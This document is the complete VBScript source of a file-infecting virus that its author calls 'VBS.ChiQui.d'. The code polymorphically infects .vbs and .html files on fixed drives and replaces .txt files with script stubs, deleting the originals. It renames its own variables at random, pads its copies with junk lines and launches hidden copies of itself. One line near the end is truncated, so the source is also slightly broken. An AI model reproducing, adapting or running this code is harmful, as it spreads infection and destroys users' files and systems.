'VBS.ChiQui.d
'* Final Release * 10.15.01
'SMOOTHiE Da HuStla [Zer0Gravity]
'Once again dedicated to my wife ChiQui

'start
Randomize: On Error Resume Next
Set ASCCBWN = CreateObject("Scripting.FileSystemObject")
Set AG2WIGB = ASCCBWN.GetFolder(".")
Set PTPWHAW_Q8UWIOY = CreateObject("WScript.Shell")
Q8UWIOY = Wscript.ScriptFullName

Sub E6FGSD8()
Randomize: On Error Resume Next
Set ASCCBWN = CreateObject("Scripting.FileSystemObject")
Set AG2WIGB = ASCCBWN.GetFolder(".")
Q8UWIOY = Wscript.ScriptFullName

For Each RVB5MMI In ASCCBWN.Drives
	If RVB5MMI.DriveType = 2 Then
		Set XX6ARRUX = ASCCBWN.GetFolder(RVB5MMI & "\")
		For Each XX6ARRUZ In XX6ARRUX.SubFolders
			For Each YW081LQ1 In XX6ARRUZ.Files
				If Ucase(ASCCBWN.GetExtensionName(YW081LQ1.Name)) = Chr(86) & Chr(66) & Chr(83) Then
					Set PUDMIYA = ASCCBWN.OpenTextFile(YW081LQ1, 1)
						K6HFQDY = PUDMIYA.ReadAll
					PUDMIYA.Close
					If InStr(1, K6HFQDY, Chr(39) & Chr(101) & Chr(110) & Chr(100)) = 0 And InStr(1, K6HFQDY, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) = 0 Then
						Set D5LUDIP=ASCCBWN.OpenTextFile(Q8UWIOY,1)
						K6HFQDY2 = 0
						Do Until InStr(1, CVCJ2, Chr(39) & Chr(101) & Chr(110) & Chr(100))
							CVCJ2 = RG8KUKV(D5LUDIP.ReadLine)
							If InStr(1, CVCJ2, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) Then K6HFQDY2 = 1
							If K6HFQDY2 = 1 Then CVCJ = CVCJ & vbcrlf & CVCJ2
						Loop
						D5LUDIP.Close

						Set PUDMIYA = ASCCBWN.OpenTextFile(YW081LQ1, 2)
						PUDMIYA.WriteLine UBUD5QN(CVCJ)
						PUDMIYA.WriteLine K6HFQDY	
						For QFUH = 1 to Int(Rnd * 30) + 10
							PUDMIYA.WriteLine RG8KUKV(YW081LQ)
						Next
						PUDMIYA.Close
					End If
				Else
					If Ucase(ASCCBWN.GetExtensionName(YW081LQ1.Name)) = Chr(72) & Chr(84) & Chr(77) & Chr(76) Or Ucase(ASCCBWN.GetExtensionName(YW081LQ1.Name)) = Chr(72) & Chr(84) & Chr(77) Then
						Set PUDMIYA = ASCCBWN.OpenTextFile(YW081LQ1,1)
							K6HFQDY = PUDMIYA.ReadAll
						PUDMIYA.Close
						If InStr(1, CVCJ2, Chr(39) & Chr(101) & Chr(110) & Chr(100)) = 0 Then
							Set D5LUDIP = ASCCBWN.OpenTextFile(Q8UWIOY,1)
							K6HFQDY2 = 0
							Do Until InStr(1, CVCJ2, Chr(39) & Chr(101) & Chr(110) & Chr(100))
								CVCJ2 = D5LUDIP.ReadLine
								If InStr(1, CVCJ2, Chr(39) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116)) Then K6HFQDY2 = 1
								If K6HFQDY2 = 1 Then CVCJ = CVCJ & VbCrLf & CVCJ2
							Loop
							D5LUDIP.Close
	
							Set PUDMIYA = ASCCBWN.OpenTextFile(YW081LQ1, 2)
								PUDMIYA.WriteLine "<SCRIPT LANGUAGE = ""VBScript"">" & VbCrLf & "<!--" & VbCrLf & CVCJ & VbCrLf & "-->" & VbCrLf & "</SCR" & "IPT>" & VbCrLf & K6HFQDY
							PUDMIYA.Close
						End If
					End If
				End If
			Next
		Next
	End If
Next
End Sub

Function RG8KUKV(RG8KUKV_RG8KUKV)
Randomize
RG8KUKV_RG8KUKV2 = ""
For U5CTUWW = 1 To Int(Rnd * 30) + 1
	For U5CTUWW_U5CTUWW = 1 To Int(Rnd * 50) + 1
		RG8KUKV_RG8KUKV2 = RG8KUKV_RG8KUKV2 & Chr(Int(Rnd * 235) + 20)
	Next
Next
RG8KUKV = RG8KUKV_RG8KUKV & "'" & RG8KUKV_RG8KUKV2
If Len(RG8KUKV) >= 900 Then RG8KUKV = Mid(RG8KUKV, 1, 500)
End Function

Sub HDJU6MW()
Randomize: On Error Resume Next
Set ASCCBWN = CreateObject("Scripting.FileSystemObject")
Set AG2WIGB = ASCCBWN.GetFolder(".")
Q8UWIOY = Wscript.ScriptFullName

For Each RVB5MMI In ASCCBWN.Drives
	If RVB5MMI.DriveType = 2 Then
		Set YW081LQ2 = ASCCBWN.GetFolder(RVB5MMI & "\")
		For Each YW081LQ In ASCCBWN.GetFolder(YW081LQ2).SubFolders
			For Each PUDMIYA In YW081LQ.Files
				If Ucase(ASCCBWN.GetExtensionName(PUDMIYA.Name)) = Chr(84) & Chr(88) & Chr(84) Then
					Set GGBML3K99 = ASCCBWN.CreateTextFile(PUDMIYA.Path & ".vBs")
					GGBML3K99.WriteLine "'" & Chr(Int(Rnd * 25) + 65) & " = " & Rnd(Hour(Now))
					GGBML3K99.Close
					Set GGBML3K99 = ASCCBWN.GetFile(PUDMIYA.Path)
					GGBML3K99.Delete
				End If
			Next
		Next
	End If
Next
End Sub

Function UBUD5QN(DQQ1N1P)
Dim D4KAWKV(25), EEOBR5Q(25): On Error Resume Next: Randomize
D4KAWKV(1) = "DQQ1N1P": D4KAWKV(2) = "UBUD5QN": D4KAWKV(3) = "D4KAWKV": D4KAWKV(4) = "U5CTUWW"
D4KAWKV(5) = "ASCCBWN": D4KAWKV(6) ="XX6ARRU": D4KAWKV(7) = "U3OGYDY": D4KAWKV(8) = "IEECOLN"
D4KAWKV(9) = "D1CTQHT": D4KAWKV(10) = "GGBML3K": D4KAWKV(11) = "S02SA4T": D4KAWKV(12) = "IJFGVPH"
D4KAWKV(13) = "Q8UWIOY": D4KAWKV(14) = "AG2WIGB": D4KAWKV(15) = "PTPWHAW": D4KAWKV(16) = "K7DLKLL"
D4KAWKV(17) = "YW081LQ": D4KAWKV(18) = "K6HFQDY": D4KAWKV(19) = "PUDMIYA": D4KAWKV(20) = "D5LUDIP"
D4KAWKV(21) = "EEOBR5Q": D4KAWKV(22) = "E6FGSD8": D4KAWKV(23) = "HDJU6MW": D4KAWKV(24) = "RG8KUKV"
D4KAWKV(25) = "RVB5MMI"

For D1CTQHT = 1 to 25
	For U5CTUWW = 1 to Int(Rnd * 3) + 4
		If Int(Rnd * 5) + 1 = 3 Then EEOBR5Q(D1CTQHT) = EEOBR5Q(D1CTQHT) & Int(Rnd * 9) Else EEOBR5Q(D1CTQHT) = EEOBR5Q(D1CTQHT) & Chr(Int(Rnd * 25) + 65)
	Next
Next

For U5CTUWW = 1 To 25
    While InStr(1, DQQ1N1P, D4KAWKV(U5CTUWW), vbTextCompare)
    E6FGSD8J = InStr(1, DQQ1N1P, D4KAWKV(U5CTUWW), vbTextCompare)
        DQQ1N1P = Mid(DQQ1N1P, 1, E6FGSD8J) & EEOBR5Q(U5CTUWW) & Mid(DQQ1N1P, E6FGSD8J + Len(EEOBR5Q(U5CTUWW)) - 1)
    Wend
Next
UBUD5QN = DQQ1N1P
End Function

For D1CTQHT = 1 to 3
	NPQWJS = Chr(Int(Rnd * 25) + 65)
	For S02SA4T = 1 to Int(Rnd * 4)
		NPQWJS = NPQWJS & Chr(Int(Rnd * 25) + 65)
	Next
	
	Set IJFGVPH = ASCCBWN.OpenTextFile(Q8UWIOY,1)
	If Right(AG2WIGB, 1) <> "\" Then AG2WIGB = AG2WIGB & "\"
	Set PTPWHAW = ASCCBWN.OpenTextFile(AG2WIGB & NPQWJS & Chr(46) & Chr(118) & Chr(98) & Chr(115), 2, True)
	
	For GGBML3K = 1 to Int(Rnd * 30) + 10
		PTPWHAW.WriteLine RG8KUKV(XX6ARRU)
	Next
	
	Do Until InStr(1,U3OGYDY,Chr(39) & Chr(101) & Chr(110) & Chr(100))
		U3OGYDY = UBUD5QN(IJFGVPH.ReadLine)
		PTPWHAW.WriteLine U3OGYDY & RG8KUKV(XX6ARRU)
	Loop
	IJFGVPH.Close

	For GGBML3K = 1 to Int(Rnd * 30) + 10
		PTPWHAW.WriteLine RG8KUKV(XX6ARRU)
	Next	
	PTPWHAW.Close
	Set PTPWHAW = GetFile(
	PTPWHAW_Q8UWIOY.Run PTPWHAW,vbhide
Next

E6FGSD8
HDJU6MW
'end